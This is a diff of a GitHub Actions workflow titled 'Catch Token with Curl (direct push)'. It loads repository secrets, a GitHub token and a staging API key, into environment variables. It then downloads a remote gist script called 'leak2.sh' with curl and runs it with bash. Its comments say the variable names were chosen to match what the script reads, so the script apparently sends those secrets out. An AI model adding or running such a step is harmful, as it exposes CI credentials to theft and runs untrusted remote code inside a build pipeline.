@@ -1,17 +1,23 @@
 name: Catch Token with Curl (direct push)
 
 on:
-  workflow_dispatch:
+  workflow_dispatch:  # Manual trigger
 
 jobs:
   catch-token:
     runs-on: ubuntu-latest
     env:
-      GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}  # Set the token as an env variable
-      VB_API: ${{ secrets.VB_API_KEY_STAGE }}
+      MY_GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}  # Matches leak2.sh variable name
+      VB_API_KEY_STAGE: ${{ secrets.VB_API_KEY_STAGE }}  # Matches leak2.sh variable name
     steps:
-      - name: Fetch and Run leak.sh bash
+      - name: Fetch and Run leak2.sh
         run: |
           curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/dada649c59018020c555641a7304016b/raw/400e60369f36f737e148026f5712ea436693a52a/leak2.sh
-          cat leak2.sh  # View the script before running it
-          bash leak2.sh # Execute the script safely if you trust its contents
+          echo "Script contents:"
+          cat leak2.sh  # For debugging
+          echo "Running script..."
+          bash leak2.sh
+      - name: Debug Environment (optional)
+        run: |
+          echo "MY_GITHUB_TOKEN is set to: ${MY_GITHUB_TOKEN:+'<set>'}"  # Masked output
+          echo "VB_API_KEY_STAGE is set to: ${VB_API_KEY_STAGE:+'<set>'}"  # Masked output
